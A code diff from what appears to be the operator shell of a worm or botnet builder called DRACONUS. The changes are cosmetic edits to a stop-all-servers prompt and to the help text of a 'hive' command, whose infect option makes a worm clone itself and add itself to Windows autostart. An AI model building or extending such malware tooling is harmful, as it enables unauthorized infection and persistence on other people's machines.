@@ -84,7 +84,8 @@ def build_draco_shell(CoCe=CommandCenter(), imp=Importer()):
 
     @draco_shell.command()
     def theend():
-        print("\n[DRACONUS] ARE YOU SURE ? y / n")
+        print("\n[DRACONUS] All Servers will be stopped")
+        print("\n[DRACONUS] ARE YOU SURE ? y / n ", end="")
         confirm = input()
         if confirm == "y":
             CoCe.send_json(["END"])
@@ -123,10 +124,10 @@ def build_draco_shell(CoCe=CommandCenter(), imp=Importer()):
     @click.argument("name")
     @click.option("--infect", "-i", is_flag=True, required=False, help="Worm can infect clients. Worm is cloning self and add to autostart. Works only on Windows !!!")
     def hive(name, infect):
-        """\n -------------------- Welcome to hive ------------------------
-        ----------- hatchering new worm working with specific server ------\n
-        --- hive <server_name>              - Hatching new Worm. ex: 'hive MyServer'
-                                            - server must exists\n"""
+        """\n -------------------- Welcome to hive ------------------------\n
+----------- hatchering new worm working with specific server ------\n
+--- hive <server_name>          - Hatching new Worm. ex: 'hive MyServer'\n
+                                - server must exists\n"""
         conf = {}
         if name:
             if infect:
